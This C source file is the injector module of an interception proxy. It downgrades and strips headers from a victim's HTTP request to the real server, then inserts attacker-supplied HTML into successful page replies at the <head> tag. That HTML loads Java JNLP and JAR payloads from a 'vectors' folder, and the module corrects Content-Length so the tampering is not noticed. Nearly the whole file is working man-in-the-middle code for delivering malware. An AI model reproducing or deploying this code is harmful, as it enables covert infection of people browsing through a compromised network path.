/*
    MODULE -- proxy module (the actual injector)

    Copyright (C) Alberto Ornaghi

    $Id: proxy_inject_exe.c 2765 2010-08-04 07:58:02Z alor $
*/

#include <main.h>
#include <proxy.h>
#include <threads.h>
#include <file.h>
#include <match.h>
#include <match_request.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <bio_injector.h>

/* globals */


/* protos */

void sanitize_header(char *header);
int fix_content_lenght(char *header, int len);
int proxy_inject_html(BIO **cbio, BIO **sbio, char *header, char *file, char *tag);
BIO* BIO_new_inject_html(const char *file, const char *tag, const char *host);

/************************************************/

int proxy_inject_html(BIO **cbio, BIO **sbio, char *header, char *file, char *tag)
{
   BIO *fbio = NULL;
   char *data;
   int data_len;
   int len, written;
   char *host, *p;
   int inject_len;

   /* retrieve the host tag */
   host = strcasestr(header, HTTP_HOST_TAG);

   if (host == NULL)
      return -EINVALID;

   SAFE_STRDUP(host, host + strlen(HTTP_HOST_TAG));

   /* trim the eol */
   if ((p = strchr(host, '\r')) != NULL)
      *p = 0;
   if ((p = strchr(host, '\n')) != NULL)
      *p = 0;

   /* connect to the real server */
   *sbio = BIO_new(BIO_s_connect());
   BIO_set_conn_hostname(*sbio, host);
   BIO_set_conn_port(*sbio, "http");

   if (BIO_do_connect(*sbio) <= 0) {
      DEBUG_MSG(D_ERROR, "Cannot connect to [%s]", host);
      SAFE_FREE(host);
      return -ENOADDRESS;
   }

   DEBUG_MSG(D_INFO, "Connection to [%s]", host);

   /*
    * sanitize the header to avoid strange reply from the server.
    * we don't want to cope with chunked encoding, gzip, deflate, 304 Not Modified an so on...
    */
   sanitize_header(header);

   DEBUG_MSG(D_EXCESSIVE, "header: [%s]", header);

   /* send the request to the server */
   BIO_puts(*sbio, header);

   SAFE_CALLOC(data, READ_BUFF_SIZE, sizeof(char));
   written = 0;

   /* read the reply header from the server */
   LOOP {
      len = BIO_read(*sbio, data + written, sizeof(char));
      if (len <= 0)
         break;

      written += len;
      if (strstr(data, CR LF CR LF) || strstr(data, LF LF))
         break;
   }

   /* if the reply is OK and the file exist, set up the injecting filter */
   if (!strncmp(data, HTTP10_200_OK, strlen(HTTP10_200_OK)) || !strncmp(data, HTTP11_200_OK, strlen(HTTP11_200_OK))) {
      struct bio_inject_setup bis;

      DEBUG_MSG(D_INFO, "Injecting java into [%s] reply...", host);

      fbio = BIO_new_inject_html(file, tag, host);

      /* get the inject len */
      BIO_ctrl(fbio, BIO_C_GET_BUF_MEM_PTR, 1, &bis);
      inject_len = bis.inject_len;

      /* update the stats */
      GBL_STATS->inf_files++;

   } else {

      DEBUG_MSG(D_INFO, "Server [%s] reply is not HTTP 200 OK", host);
      DEBUG_MSG(D_DEBUG, "Server reply is:\n%s", data);

      /* create a null filtering bio (send as it is) */
      fbio = BIO_new(BIO_f_null());
      inject_len = 0;
   }

   /* append the filter to the client bio */
   *cbio = BIO_push(fbio, *cbio);

   /* check for gzip compression */
   if (strstr(data, ": gzip")) {
      DEBUG_MSG(D_ERROR, "ERROR: GZIP compression detected, cannot attack !!");
   }

   /* fix the Content-Length in the html header */
   data_len = fix_content_lenght(data, inject_len);

   DEBUG_MSG(D_EXCESSIVE, "data: [%s]", data);

   /* send the headers to the client, the data will be sent in the callee function */
   BIO_write(*cbio, data, data_len);

   SAFE_FREE(host);
   SAFE_FREE(data);

   return ESUCCESS;
}


BIO* BIO_new_inject_html(const char *file, const char *tag, const char *host)
{
   BIO* bio = NULL;
   FILE *f;
   char jnlp_file[strlen(file) + strlen(".jnlp") + 1];
   char html_file[strlen(file) + strlen(".html") + 1];
   char jar_file[strlen(file) + strlen(".jar") + 1];
   char *html_to_inject;
   size_t html_to_inject_len;
   char ipa_url[MAX_URL];
   struct bio_inject_setup bis;

   sprintf(jnlp_file, "%s.jnlp", file);
   sprintf(html_file, "%s.html", file);
   sprintf(jar_file, "%s.jar", file);

   /* check if we have everything in place */
   f = open_data("vectors", jnlp_file, "r");
   if (f == NULL)
      return BIO_new(BIO_f_null());

   fclose(f);

   /* check if we have everything in place */
   f = open_data("vectors", jar_file, "r");
   if (f == NULL)
      return BIO_new(BIO_f_null());

   fclose(f);

   /* check if we have everything in place */
   f = open_data("vectors", html_file, "r");
   if (f == NULL)
      return BIO_new(BIO_f_null());

   /* read the content of the file */
   SAFE_CALLOC(html_to_inject, 4096, sizeof(char));
   html_to_inject_len = fread(html_to_inject, 1, 4096, f);
   fclose(f);

   /* calculate and replace the IPA_URL in the file */
   snprintf(ipa_url, MAX_URL - 1, "http://%s.%s", tag, host);
   str_replace(&html_to_inject, "%IPA_URL%", ipa_url);

   /* recalculate the size of the replaced string */
   html_to_inject_len = strlen(html_to_inject);

   /* set up the BIO */
   bio = BIO_new(BIO_f_inject());

   /* set the search string and the injection buffer */
   bis.search = "<head>";
   bis.inject = html_to_inject;
   bis.inject_len = html_to_inject_len;

   /* setup the search and inject parameters */
   BIO_ctrl(bio, BIO_C_SET_BUF_MEM, 1, &bis);

   SAFE_FREE(html_to_inject);

   DEBUG_MSG(D_VERBOSE, "IPA_URL: %s", ipa_url);

   return bio;
}


/*
 * sanitize the header to avoid strange reply from the server.
 * we don't want to cope with chunked encoding, gzip, deflate an so on...
 */
void sanitize_header(char *header)
{
   char *p, *q;
   char *end;

   /* take the end of the header buffer */
   end = header + strlen(header);

   /* downgrade the protocol from 1.1 to 1.0 to avoid chunked encoding and other amenities */
   if ((p = strstr(header, "HTTP/1.1")) != NULL) {
      memcpy(p, "HTTP/1.0", strlen("HTTP/1.0"));
   }

   /* force to use plain encoding to avoid any kind of compression */
   if ((p = strcasestr(header, HTTP_ACCEPT_ENCODING_TAG)) != NULL) {
      p += strlen(HTTP_ACCEPT_ENCODING_TAG);

      q = strchr(p, '\r');

      /* if there is enough room: write, then move. otherwise, move then write */
      if (q - p >= 4) {
         memcpy(p, "none", 4);
         memmove(p + 4, q, end + 1 - q);
      } else {
         memmove(p + 4, q, end + 1 - q);
         memcpy(p, "none", 4);
      }
   }

   /* force to not use caching (to avoid the 304 Not Modified reply from the server) */
   if ((p = strcasestr(header, HTTP_IF_NONE_MATCH_TAG)) != NULL) {
      q = strchr(p, '\n');

      /* completely remove the line */
      memmove(p, q + 1, end - q);
   }
   if ((p = strcasestr(header, HTTP_IF_MODIFIED_SINCE_TAG)) != NULL) {
      q = strchr(p, '\n');

      /* completely remove the line */
      memmove(p, q + 1, end - q);
   }

   /* force to not use connection keep-alive */
   if ((p = strcasestr(header, HTTP_CONNECTION_TAG)) != NULL) {
      p += strlen(HTTP_CONNECTION_TAG);

      q = strchr(p, '\r');

      /* if there is enough room: write, then move. otherwise, move then write */
      if (q - p >= 5) {
         memcpy(p, "close", 5);
         memmove(p + 5, q, end + 1 - q);
      } else {
         memmove(p + 5, q, end + 1 - q);
         memcpy(p, "close", 5);
      }
   }

}

int fix_content_lenght(char *header, int len)
{
   char *p, *q;
   char *end;
   int length;
   char ascii_len[16];

   /* don't modify if no lenght is given */
   if (len == 0)
      return strlen(header);

   /* take the end of the header buffer */
   end = header + strlen(header);

   /* search the content length */
   if ((p = strcasestr(header, HTTP_CONTENT_LENGTH_TAG)) != NULL) {
      p += strlen(HTTP_CONTENT_LENGTH_TAG);

      /* get the original length */
      length = atoi(p);

      /* calculate the new one */
      length += len;
      snprintf(ascii_len, sizeof(ascii_len), "%d", length);

      q = strchr(p, '\r');

      /* if there is enough room: write, then move. otherwise, move then write */
      if (q - p >= (int)strlen(ascii_len)) {
         memcpy(p, ascii_len, strlen(ascii_len));
         memmove(p + strlen(ascii_len), q, end + 1 - q);
      } else {
         memmove(p + strlen(ascii_len), q, end + 1 - q);
         memcpy(p, ascii_len, strlen(ascii_len));
      }
   }

   return strlen(header);
}

/* EOF */

// vim:ts=3:expandtab

